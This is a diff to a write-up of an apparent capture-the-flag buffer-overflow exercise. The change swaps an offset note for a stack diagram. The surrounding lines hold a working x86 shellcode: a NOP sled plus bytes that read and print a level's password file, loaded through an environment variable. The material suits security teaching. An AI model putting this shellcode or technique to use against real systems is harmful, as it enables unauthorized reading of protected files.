@@ -14,7 +14,8 @@ and the child process, ask for input with `gets`, so we can overwrite the return
 We gonna overwrite the pointer of main in the child process. The only issue is that the parent process 
 monitor the child process, preventing us of call exec in the child process.
 We gonna create a shellcode which is going to print the flag instead of opening a shell.
-Offset 156.
+
+![stack](Ressources/stack.svg)
 
 We put the shellcode in the env (`0xffffd7ae`): `export SHELLCODE=$(python -c 'print 100 * "\x90" + "\x31\xc0\x50\x68\x70\x61\x73\x73\x68\x30\x35\x2f\x2e\x68\x65\x76\x65\x6c\x68\x72\x73\x2f\x6c\x68\x2f\x75\x73\x65\x68\x68\x6f\x6d\x65\x68\x2f\x2f\x2f\x2f\x31\xc9\x31\xd2\x89\xe3\x6a\x05\x58\xcd\x80\x83\xec\x29\x89\xc3\x89\xe1\x6a\x29\x5a\x6a\x03\x58\xcd\x80\x6a\x01\x5b\x6a\x04\x58\xcd\x80"')` 
 
